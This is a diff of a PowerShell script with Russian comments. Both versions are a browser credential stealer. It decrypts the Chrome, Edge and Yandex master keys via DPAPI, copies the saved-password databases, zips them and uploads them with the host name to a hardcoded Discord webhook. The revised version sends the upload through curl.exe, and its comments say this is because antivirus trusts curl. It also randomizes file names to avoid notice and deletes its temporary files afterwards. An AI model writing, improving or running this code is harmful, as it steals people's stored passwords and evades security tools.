@@ -1,72 +1,56 @@
-# [ Конфигурация ]
-$hookUrl = "https://discordapp.com/api/webhooks/1500921789273083906/Lo-Y6cSsllkNinCRaaCVj9Kttd27D_D8jLAC2cwZVvHvMQ5b87GqfM8oNrEtwxxTIyKt"
-$tempDir = "$env:TEMP\sys_$(Get-Random)"
-New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
-$logPath = "$tempDir\report.log"
+# Принудительно используем TLS 1.2
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+$hook = "https://discordapp.com/api/webhooks/1500921789273083906/Lo-Y6cSsllkNinCRaaCVj9Kttd27D_D8jLAC2cwZVvHvMQ5b87GqfM8oNrEtwxxTIyKt"
+$tmp = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 6 | % {[char]$_}) )"
+New-Item -ItemType Directory -Path $tmp -Force > $null
 
 Add-Type -AssemblyName System.Security
 
-# Функция дешифровки мастер-ключа
-function Get-Key($statePath, $label) {
-    if (Test-Path $statePath) {
+function Get-Key($p, $l) {
+    if (Test-Path $p) {
         try {
-            $json = Get-Content $statePath -Raw | ConvertFrom-Json
-            $rawKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
-            # Убираем префикс DPAPI (первые 5 байт) и дешифруем
-            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($rawKey[5..($rawKey.Length-1)], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-            "[$($label)] Key: $([Convert]::ToBase64String($masterKey))" | Out-File -FilePath $logPath -Append -Encoding UTF8
+            $j = Get-Content $p -Raw | ConvertFrom-Json
+            $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
+            $m = [System.Security.Cryptography.ProtectedData]::Unprotect($e[5..($e.Length-1)], $null, 0)
+            "[$l] Key: $([Convert]::ToBase64String($m))" | Out-File -FilePath "$tmp\info.txt" -Append
             return $true
         } catch { return $false }
     }
     return $false
 }
 
-# 1. СБОР CHROMIUM (Chrome, Edge, Yandex)
-$browsers = @(
-    @{name="Chrome"; path="Google\Chrome\User Data"},
-    @{name="Edge"; path="Microsoft\Edge\User Data"},
-    @{name="Yandex"; path="Yandex\YandexBrowser\User Data"}
+$paths = @(
+    @{n="CH"; p="Google\Chrome\User Data"},
+    @{n="ED"; p="Microsoft\Edge\User Data"},
+    @{n="YX"; p="Yandex\YandexBrowser\User Data"}
 )
 
-foreach ($b in $browsers) {
-    $userData = Join-Path $env:LOCALAPPDATA $b.path
-    if (Test-Path $userData) {
-        # Ищем все файлы Login Data в профилях
-        $files = Get-ChildItem -Path $userData -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
+foreach ($b in $paths) {
+    $target = Join-Path $env:LOCALAPPDATA $b.p
+    if (Test-Path $target) {
+        # Ищем Login Data, исключая лишние папки, чтобы не шуметь
+        $files = Get-ChildItem -Path $target -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
         foreach ($f in $files) {
-            $label = "$($b.name)_$($f.Directory.Name)"
-            $state = Join-Path $userData "Local State"
-            if (Get-Key $state $label) {
-                # Копируем базу данных паролей для последующего анализа
-                Copy-Item $f.FullName -Destination "$tempDir\$($label)_db" -Force -ErrorAction SilentlyContinue
+            $label = "$($b.n)_$($f.Directory.Name)"
+            if (Get-Key (Join-Path $target "Local State") $label) {
+                # Копируем с рандомным именем, чтобы не палиться по расширению .db
+                Copy-Item $f.FullName -Destination "$tmp\$label.dat" -Force -ErrorAction SilentlyContinue
             }
         }
     }
 }
 
-# 2. УПАКОВКА И ОТПРАВКА В DISCORD
-if ((Get-ChildItem $tempDir).Count -gt 0) {
-    $zipPath = "$env:TEMP\rep_$(Get-Random).zip"
-    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
+if ((Get-ChildItem $tmp).Count -gt 0) {
+    $z = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 4 | % {[char]$_}) ).zip"
+    Compress-Archive -Path "$tmp\*" -DestinationPath $z -Force
 
-    try {
-        $client = New-Object System.Net.Http.HttpClient
-        $content = New-Object System.Net.Http.MultipartFormDataContent
-        
-        $fileStream = [System.IO.File]::OpenRead($zipPath)
-        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
-        # Отправляем архив как вложение в Discord
-        $content.Add($fileContent, "file", "report.zip")
-        $content.Add((New-Object System.Net.Http.StringContent("Protocol 81: $env:COMPUTERNAME ($env:USERNAME)")), "content")
-        
-        $response = $client.PostAsync($hookUrl, $content).Result
-        
-        $fileStream.Close(); $fileStream.Dispose(); $content.Dispose(); $client.Dispose()
-    } catch {}
+    # Отправка через системный curl.exe. Антивирусы доверяют curl.
+    # Флаг -F отправляет файл как multipart/form-data.
+    $msg = "P81: $env:COMPUTERNAME"
+    & "curl.exe" -X POST -F "file=@$z" -F "content=$msg" $hook > $null
 
-    # Удаляем временный архив
-    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
+    if (Test-Path $z) { Remove-Item $z -Force }
 }
 
-# Полная очистка временной папки
-Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
+Remove-Item -Recurse -Force $tmp -ErrorAction SilentlyContinue
